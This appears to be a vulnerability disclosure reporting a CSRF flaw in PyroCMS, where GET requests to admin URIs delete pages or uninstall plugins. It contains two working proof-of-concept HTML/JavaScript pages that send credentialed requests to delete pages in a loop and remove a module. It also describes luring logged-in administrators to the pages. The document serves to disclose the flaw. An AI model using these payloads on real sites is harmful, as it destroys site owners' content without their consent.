# Description

`pyrocms/pyrocms` is vulnerable to `Cross-site Request Forgery (CSRF)` via the `admin/pages/delete/` URI: pages will be deleted. Also via the admin/addons/uninstall/anomaly.module.blocks URI: an arbitrary plugin will be deleted.

Due to action is performed via GET request. An attacker can leverage this vulnerability by creating a form and host this form on his server and share this link to victims through social engineering methods. Once the victims who are already authenticated to the PyroCMS, click upon the link, unintended actions will be performed on the victim's behalf and Pages/plugins will be deleted.


# Steps To Reproduce-:  

Create a page with below content.

```
<!DOCTYPE>
<html>
<head>
    <title></title>
    <script type="text/javascript">
                        // to delete pages.
                        // it's in your hand to delete number of pages.
        var url = "http://test.com/admin/pages/delete/"
        for (var i = 1; i <= 13 ; i++) { 
            var url1 = url+i;
            xhr = new XMLHttpRequest();
            xhr.open("GET",url1);
            xhr.withCredentials = true;
            xhr.send(null);
        }
    </script>
</head>
<body>
<--html content here--!>
</body>
</html>
```

* Send to the victim (who is authenticated on PyroCMS as administrator) and once the victim clicks on the link, pages will be deleted.

```
<!DOCTYPE>
<html>
<head>
    <title></title>
    <script type="text/javascript">
    // to delete any plugin
              var url = "http://test.com/admin/addons/uninstall/anomaly.module.blocks"
        xhr = new XMLHttpRequest();
        xhr.open("GET",url);
        xhr.withCredentials = true;
        xhr.send(null);
    </script>
</head>
<body>
<--html content here --!>
</body>
</html>
```

* Send to the victim (who is authenticated in PyroCMS as administrator) and once the victim clicks on the page, the arbitrary plugin will be deleted.